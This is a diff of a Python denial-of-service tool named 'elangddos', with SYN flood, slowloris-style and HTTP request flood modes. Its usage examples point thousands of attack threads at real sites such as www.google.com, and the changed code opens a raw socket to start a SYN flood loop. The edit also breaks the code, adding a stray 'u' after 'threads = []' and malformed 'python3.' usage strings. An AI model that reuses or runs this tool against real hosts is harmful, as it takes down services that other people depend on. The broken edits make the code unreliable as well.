@@ -392,15 +392,15 @@ class Synflood(Thread):
 
 def main():
 	parser = ArgumentParser(
-		usage='python3%(prog)s -t [target] -p [port] -T [number threads]',
+		usage='python3.%(prog)s -t [target] -p [port] -T [number threads]',
 		formatter_class=RawTextHelpFormatter,
-		prog='elangddos',
+		prog='elangddos.py',
 		description=cprint(title, 'white', attrs=['bold']),
 		epilog='''
 Example:
-    python3%(prog)s -t www.example.com -p 80 -T 2000 -Pyslow
-    python3%(prog)s -t www.domain.com -s 100 -Request
-    python3%(prog)s -t www.google.com -Synflood -T 5000 -t 10.0
+    python3.%(prog)s -t www.example.com -p 80 -T 2000 -Pyslow
+    python3.%(prog)s -t www.domain.com -s 100 -Request
+    python3.%(prog)s -t www.google.com -Synflood -T 5000 -t 10.0
 '''
 	)
 	options = parser.add_argument_group('options', '')
@@ -437,7 +437,7 @@ Example:
 		synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
 		synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
 		ts = []
-		threads = []
+		threads = []u
 		print(colored('[*] Started SYN Flood: ', 'blue') + colored(tgt, 'red'))
 		while 1:
 			if args.i == False:
